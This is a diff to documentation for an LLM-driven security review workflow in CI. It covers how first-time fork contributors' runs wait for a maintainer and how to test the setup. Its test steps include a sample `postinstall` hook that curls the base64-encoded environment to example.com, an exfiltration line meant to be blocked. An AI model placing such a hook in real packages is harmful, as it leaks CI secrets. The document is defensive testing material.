@@ -11,7 +11,7 @@ contributors holds the runs. The review workflow is what approves them.
 |---|---|---|
 | a branch of this repository (maintainers) | at once | at once |
 | Dependabot (a branch of this repository) | at once, with a read-only token and Dependabot's secrets only | at once, reviewed like any other pull request |
-| a fork | held (`action_required`) until they are approved: by the review, on PASS, for that commit; or by a maintainer | at once |
+| a fork | held (`action_required`) until they are approved: by the review, on PASS, for that commit; or by a maintainer | at once if its author has had a commit merged here; otherwise when a maintainer re-runs it ([First-time contributors](#first-time-contributors)) |
 
 Pull requests from forks are held because of the repository setting **Require
 approval for all external contributors** (Settings → Actions → General). A
@@ -57,6 +57,24 @@ Drafts are not reviewed. Their runs wait until the pull request is marked
 ready. The repository variable `LLM_REVIEW_ENABLED` switches the review on
 (`true`). When it is off, every job of the workflow is skipped, and a fork's
 runs wait for a maintainer.
+
+### First-time contributors
+
+Each review spends the gateway's key, and anyone with a GitHub account can
+open a pull request from a fork and push to it again and again. So a fork's
+pull request is reviewed at once only when its author has had a commit merged
+here (`author_association` is `CONTRIBUTOR`, `COLLABORATOR`, `MEMBER` or
+`OWNER`). Any other author's (`FIRST_TIME_CONTRIBUTOR`, `FIRST_TIMER`, `NONE`)
+review fails at its first step, before the checkout and the gateway proxy, and
+the comment says that it waits for a maintainer. A maintainer reads the pull
+request and starts the review with **Re-run all jobs**. Only someone with write
+access can re-run a run, so the job takes a second attempt as a maintainer's
+go-ahead. Each push makes a new run, which waits again.
+
+The job fails rather than being skipped: a skipped job passes a required
+check. A label is not the go-ahead for the same reason: each label added to a
+pull request (Dependabot adds its own) would start a run whose skipped job
+passes the check, and whose start cancels a review that is still going.
 
 ## Threat analysis
 
@@ -266,8 +284,10 @@ scoped to the pull request, and put their checks on its commit.
 - Read the comment and the run. A BLOCK names its findings. With no verdict,
   the run says why (the gateway, the model, a transcript that could not be
   checked).
-- To run the review again: open the pull request's `llm-security-review` run
-  and choose **Re-run all jobs**. A PASS approves the waiting runs.
+- To run the review again, or to start a first-time contributor's: open the
+  pull request's `llm-security-review` run and choose **Re-run all jobs**. A
+  PASS approves the waiting runs. Approving the runs by hand instead leaves the
+  required check failed.
 - To run CI anyway: in the pull request, choose **Approve workflows to run**.
   First read what the pull request changes under `.github/`, in `scripts/`, in
   the package scripts and in `build.rs`. Those run in its CI.
@@ -287,9 +307,14 @@ for example a throwaway account.
 1. With that account, fork `getdroppen/droppen`, and in the fork change one line
    of a document (for example a typo in `docs/ui-spec.md`). Commit it with
    `git commit -s`, then open a pull request against `getdroppen/droppen:main`.
-2. On the pull request, under Checks, check that:
-   - `llm-security-review` is running;
+2. The account has had nothing merged, so on the pull request, under Checks,
+   check that:
+   - `llm-security-review` failed at its first step, and the comment says the
+     review waits for a maintainer;
    - `ci` and `pr-guard` show as waiting for approval.
+
+   Then re-run the review's run (**Re-run all jobs**) and check that
+   `llm-security-review` is running, its first step naming you.
 
    The API agrees:
 
@@ -307,8 +332,9 @@ for example a throwaway account.
    - the check `llm-security-review` appears on the pull request's commit and
      satisfies the ruleset.
 4. Push a second harmless commit to the fork. The new commit's runs wait again,
-   and its own review approves them. The first commit's review approved
-   nothing of the second's.
+   and so does its review, until you re-run it; then it approves them. The
+   first commit's review approved nothing of the second's. From here on, re-run
+   the review after each push.
 5. Push a commit that should block, for example a `postinstall` script in
    `package.json` that runs `curl https://example.com/$(env | base64)`. Check
    three things:
